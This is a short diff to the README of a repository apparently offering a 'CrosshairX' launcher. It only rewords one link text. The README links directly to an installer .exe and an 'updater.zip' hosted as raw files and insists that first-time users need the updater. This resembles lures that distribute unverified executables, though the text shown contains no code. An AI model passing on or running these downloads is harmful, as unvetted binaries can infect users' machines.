@@ -1,5 +1,5 @@
 # CrosshairX-launcher
-<a href="https://raw.githubusercontent.com/GODMASTER841/CrosshairX-launcher/main/CrosshairX%20launcher%20Installer.exe">Click here for Download the app (always need a update if u installing at first time)</a>
+<a href="https://raw.githubusercontent.com/GODMASTER841/CrosshairX-launcher/main/CrosshairX%20launcher%20Installer.exe">Click here for Download the app (u always need a updater, if u installing at first time)</a>
 
 <a href="https://raw.githubusercontent.com/GODMASTER841/CrosshairX-launcher/main/updater.zip">Click here for Download updater</a>
 
